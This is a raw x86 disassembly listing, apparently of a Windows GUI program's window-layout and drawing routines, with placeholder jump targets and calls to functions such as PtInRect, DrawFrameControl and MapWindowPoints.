pop ebx
pop ebp
retn
mov eax ebx
call sub_451c00
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451bd8
call sub_452380
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451c00
call sub_452380
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_451738
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_451738
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4525ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44c4e4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_41723c
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452640
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4525ac
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451c00
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_451e4c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451c00
call sub_452380
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_4526c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404164
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4047b0
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_452710
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452908
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_452de0
mov eax [ ebp - 0x8 ]
call sub_451ddc
xor edx edx
push ebp
push sub_4528eb
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4528f2
mov eax [ ebp - 0x8 ]
call sub_451de0
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4515b4
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_4526c8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403564
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4518d4
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_4526c8
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_448ed4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_449ccc
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403368
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_452918
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_417264
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42516c
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452970
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_4246c4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424e20
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424dc0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424dc0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_4246c4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424dc0
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424dc0
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4529f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_452918
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_452970
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_452970
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_452918
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_452970
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_452970
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_452ad4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452c2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_447b68
mov eax [ ebp - 0x4 ]
call sub_424df8
xor eax eax
push ebp
push sub_452c0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4251ec
xor eax eax
push ebp
push sub_452bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44c4e4
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452bf7
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4251ec
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44c4a8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448954
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_452c38
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44e2e4
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_4489fc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4489b8
mov ecx eax
xor edx edx
xor eax eax
call sub_417264
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_44f7b4
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41728c
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_452dac
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_452dac
pop ecx
mov eax ebx
call sub_403368
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_452dac
pop ecx
sub_452de0
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_452dac
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403368
xor eax eax
mov [ esi + 0x64 ] eax
sub_452e3c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451e4c
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_452e78
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_452e78
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4530e5
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405fc8
mov edx [ ebp - 0x8 ]
pop eax
call sub_40442c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax [ ebx + 0x14 ]
call sub_4515d8
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405fc8
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405fc8
mov edx [ ebp - 0x10 ]
pop eax
call sub_40442c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4530ec
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404188
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_451988
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_451b00
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_451b3c
mov eax [ ebx + 0x18 ]
call sub_451988
mov [ edx + 0x18 ] eax
push esi
push sub_453688
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_451eb4
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_451b3c
mov eax [ esi + 0x64 ]
call sub_451b00
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403368
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_453660
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403368
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_451684
mov edx eax
mov eax edi
call sub_451b28
mov eax edi
call sub_451988
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_453688
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_451eb4
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_453688
mov edx [ eax + 0x14 ]
mov eax esi
call sub_451eb4
mov eax [ ebx + 0x14 ]
call sub_403368
mov eax edi
call sub_403368
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_4530f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44e2e4
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_408110
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_451b28
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44e250
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_451b28
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_453510
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_453688
xor edx edx
mov eax edi
call sub_451eb4
sub_4531d0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451b00
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402b1c
mov edx eax
mov eax ebx
call sub_451b28
sub_45320c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_453277
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404424
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45327e
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_453284
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_453333
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_451890
mov eax [ ebp - 0x8 ]
call sub_45320c
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_453284
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45333a
lea eax [ ebp - 0x8 ]
call sub_404164
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_453284
pop ecx
sub_453340
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453479
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
